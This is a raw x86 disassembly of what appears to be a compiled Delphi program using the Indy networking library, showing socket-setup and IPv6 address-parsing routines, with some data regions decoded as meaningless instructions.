mov edx 0x1c
call sub_403728
mov [ ebp - 0xa0 ] 0x17
push 0x1
lea ecx [ ebp - 0x98 ]
mov edx esi
mov eax ebx
call sub_46bdb8
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x98 ]
mov ecx 0x10
call sub_402f9c
movzx eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x9e ] ax
lea esi [ ebp - 0x84 ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push 0x1c
lea eax [ ebp - 0xa0 ]
push eax
push 0xc8000014
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
mov edx [ ebp + 0xc ]
lea eax [ esi + 0x8 ]
mov ecx 0x10
call sub_402f9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e550
lea eax [ ebp - 0xa4 ]
call sub_404e44
retn
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xa4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_46e55c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edx esi
mov ecx [ ebp + 0x14 ]
call sub_463a38
jmp r-xdata
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx esi
mov eax ebx
call sub_46e5b0
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_46c49c
sub_46e5b0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46e76d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp eax 0xffff
jbe r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46e438
mov eax [ esi ]
call sub_406248
add eax 0x28
jno r-xdata
call sub_403e2c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
add edx eax
lea eax [ ebp - 0x1c ]
mov ecx 0x10
call sub_402f9c
mov ebx 0x10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
lea edx [ eax + ebx ]
lea eax [ ebp - 0x2c ]
mov ecx 0x10
call sub_402f9c
add ebx 0x10
jno r-xdata
mov eax [ esi ]
call sub_406248
test eax eax
jns r-xdata
call sub_403e34
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
lea edx [ ebp - 0x4 ]
mov ecx ebx
call sub_463a60
add ebx 0x4
jno r-xdata
call sub_403e2c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_403e34
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
add eax ebx
xor ecx ecx
mov edx 0x3
call sub_403728
add ebx 0x3
jno r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_403e34
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
mov [ eax + ebx ] 0x3a
add ebx 0x1
jno r-xdata
mov eax 0x2
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
mov eax 0x3
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
push ebx
mov eax [ esi ]
call sub_406248
push eax
lea ecx [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
call sub_463a00
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edx esi
mov ecx [ ebp + 0x10 ]
call sub_463a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e774
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_46e780
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46ea55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x4
jle r-xdata
mov eax [ ebx ]
call sub_406248
push eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx ebx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xb8 ]
test eax eax
jns r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
mov eax [ ebp - 0x18 ]
mov [ esi + 0x8 ] eax
call sub_403e2c
mov eax [ ebx ]
call sub_406248
test eax eax
jns r-xdata
call sub_46b69c
call sub_46b69c
mov edi eax
push edi
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebx ]
call sub_406248
test eax eax
jns r-xdata
call sub_403e2c
mov [ ebp - 0x20 ] eax
xor eax eax
mov edx [ ebx ]
test edx edx
je r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x70 ]
xor ecx ecx
mov edx 0x1c
call sub_403728
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x60 ] edi
xor eax eax
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov [ ebp - 0x5c ] eax
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] 0x10
push 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_46b428
mov edx eax
mov eax [ rw-data ]
call sub_46bf40
lea eax [ ebp - 0x74 ]
push eax
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_46bc54
mov edx [ ebp - 0x74 ]
lea eax [ esi + 0x4 ]
call sub_404e98
movzx eax [ ebp - 0x36 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov [ esi + 0x8 ] eax
jmp r-xdata
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] 0x1c
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_46b428
mov edx eax
mov eax [ ebp - 0xc ]
call sub_46bf40
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x4c ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_46bc54
mov edx [ ebp - 0x78 ]
lea eax [ esi + 0x4 ]
call sub_404e98
movzx eax [ ebp - 0x52 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov [ esi + 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea5c
lea eax [ ebp - 0x80 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebx + 0x8 ]
sub eax 0x13
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
call sub_46c49c
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax ebx
call sub_46b684
mov edi eax
lea eax [ ebp - 0x7c ]
push eax
mov edx edi
xor ecx ecx
mov eax [ rw-data ]
call sub_46bc54
mov edx [ ebp - 0x7c ]
lea eax [ esi + 0xc ]
call sub_404e98
mov eax [ edi + 0x4 ]
mov [ esi + 0x18 ] eax
mov eax ebx
call sub_46b684
movzx eax [ eax ]
mov [ esi + 0x1c ] al
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x70 ]
mov edx ebx
call sub_46b628
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_46b684
mov edi eax
lea eax [ ebp - 0x80 ]
push eax
mov edx edi
mov cl 0x1
mov eax [ rw-data ]
call sub_46bc54
mov edx [ ebp - 0x80 ]
lea eax [ esi + 0xc ]
call sub_404e98
mov eax [ edi + 0x10 ]
mov [ esi + 0x18 ] eax
jmp r-xdata
sub_46ea68
push ebx
push esi
mov esi eax
push 0x0
push 0x0
movzx eax dl
mov edx [ rw-data ]
mov edx [ edx + eax * 4 ]
mov ecx 0x1
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc0 ]
cmp eax 0xffffffff
setne bl
cmp eax 0xffffffff
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
sub_46eaa8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46eae1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eae8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_46eaf0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jmp r-xdata
xor al [ eax ]
sub_46eb0f
add [ eax ] dl
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
lodsb [ esi ]
test [ esi ] 0x6449450e
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cld
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x6fffb913 ] cl
xor al [ eax ]
cmp ch ch
jb r-xdata
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
outsd
jb r-xdata
add [ edi + edi + 0x40 ] dl
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
fsub st5
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0xf8
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
hlt
imul esi [ ebx + 0x74 ] 0xec24c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
in al dx
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
retn
pushfd
jmp r-xdata
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
in eax dx
inc esi
add [ eax + 0x38004032 ] dl
in eax dx
sub_46eb54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x46eb 0x0
or [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x6fffb913 ] cl
xor al [ eax ]
cmp ch ch
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
sub_46ebbd
in eax dx
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edi + edi + 0x40 ] dl
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
fsub st5
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0xf8
inc esi
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
hlt
imul esi [ ebx + 0x74 ] 0xec24c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
in al dx
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
sub_46ece0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_46ed2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x20 ]
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ed32
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_46ed38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ed88
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x4 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_46eddc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ee14
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_46ef54
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x8 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov esi eax
cmp esi 0xffffffff
jle r-xdata
xor ebx ebx
jmp r-xdata
cmp esi 0x100
jl r-xdata
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0xc ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov esi eax
test bl bl
je r-xdata
mov bl 0x1
xor eax eax
jmp r-xdata
cmp esi 0xffffffff
jle r-xdata
mov ebx eax
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x10 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov esi eax
test bl bl
je r-xdata
cmp esi 0x100
jl r-xdata
xor eax eax
jmp r-xdata
cmp esi 0xffffffff
jle r-xdata
mov al 0x1
mov ebx eax
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x14 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov esi eax
test bl bl
je r-xdata
cmp esi 0x100
jl r-xdata
xor eax eax
jmp r-xdata
cmp esi 0xffffffff
jle r-xdata
mov al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef5b
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
cmp esi 0x100
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al 0x1
sub_46ef70
push ebp
mov ebp esp
push ecx
mov ecx 0x10
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_46f627
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f62e
lea eax [ ebp - 0x84 ]
mov edx 0x11
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405170
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] eax
mov esi 0x1
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
sub eax 0x3
jne r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x6
jae r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x5
jae r-xdata
inc esi
movzx eax [ eax + esi - 0x1 ]
cmp eax 0x3a
jg r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x34 ]
sub ecx 0x1
jno r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
add eax 0xffffffbf
sub eax 0x6
jb r-xdata
je r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x44 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
inc eax
mov eax [ ebp + eax * 4 - 0x38 ]
cmp eax [ ebp - 0x40 ]
jg r-xdata
call sub_403e2c
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
add eax 0xffffffe6
sub eax 0x6
jb r-xdata
add [ ebp - 0xc ] 0x1
jno r-xdata
sub eax 0x2e
je r-xdata
cmp edi 0xffff
jg r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
call sub_403e34
add [ ebp - 0x8 ] 0x1
jno r-xdata
add eax 0xfffffffe
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x4c ]
mov eax ebx
mov ecx r-xdata
call sub_405170
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0xc ]
sub eax 0x2
jl r-xdata
mov eax [ ebp - 0x4 ]
dec esi
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
call sub_403e34
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov esi 0x2
inc eax
mov [ ebp + eax * 4 - 0x38 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebp - 0x8 ]
dec eax
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e34
inc eax
mov [ ebp + eax * 4 - 0x44 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebx ]
call sub_405120
mov edx eax
sub edx 0x1
jno r-xdata
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc eax
mov edx [ ebp + eax * 4 - 0x38 ]
add edx 0x1
jno r-xdata
call sub_403e2c
inc eax
mov edi [ ebp + eax * 4 - 0x38 ]
dec esi
cmp esi 0x7
jbe r-xdata
call sub_403e2c
mov eax ebx
call sub_4055ac
call sub_403e34
inc eax
mov esi [ ebp + eax * 4 - 0x38 ]
mov ecx [ ebp - 0x40 ]
sub ecx esi
jno r-xdata
call sub_403e2c
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x60 ]
lea eax [ ebp - 0x5c ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x5c ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
inc esi
mov eax [ ebp + esi * 4 - 0x38 ]
sub eax 0x1
jno r-xdata
call sub_403e2c
sub ecx 0x1
jno r-xdata
call sub_403e34
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
cmp edi eax
jne r-xdata
call sub_403e34
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e34
push [ ebx ]
lea eax [ ebp - 0x64 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x64 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
lea eax [ ebp - 0x54 ]
push eax
dec esi
cmp esi 0x7
jbe r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc eax
mov edx esi
add edx 0x1
jno r-xdata
call sub_403e2c
inc esi
mov ecx [ ebp + esi * 4 - 0x38 ]
mov eax esi
sub eax 0x1
jno r-xdata
call sub_403e2c
mov [ ebp - 0xd ] 0x1
mov eax 0x8
sub eax [ ebp - 0xc ]
jno r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x68 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e34
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
call sub_403e34
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
inc eax
sub ecx edi
jno r-xdata
call sub_403e2c
mov edi eax
test edi edi
jle r-xdata
sub eax 0x2
jno r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x6c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x40 ]
sub ecx esi
jno r-xdata
sub ecx 0x1
jno r-xdata
call sub_403e34
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_40512c
dec edi
jne r-xdata
call sub_403e34
sub ecx 0x1
jno r-xdata
call sub_403e34
mov eax esi
sub eax 0x1
jno r-xdata
call sub_403e34
mov eax esi
sub eax 0x1
jno r-xdata
jmp r-xdata
mov edx esi
add edx 0x1
jno r-xdata
call sub_403e34
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e34
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x70 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
inc eax
mov edx edi
add edx 0x1
jno r-xdata
call sub_403e2c
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x50 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x50 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
push [ ebx ]
lea eax [ ebp - 0x74 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x74 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x38 ]
mov esi [ ebp - 0x3c ]
sub ecx esi
jno r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
sub ecx 0x1
jno r-xdata
call sub_403e34
push [ ebx ]
lea eax [ ebp - 0x58 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x58 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
mov edx esi
add edx 0x1
jno r-xdata
call sub_403e34
mov eax [ ebp - 0x4 ]
call sub_405384
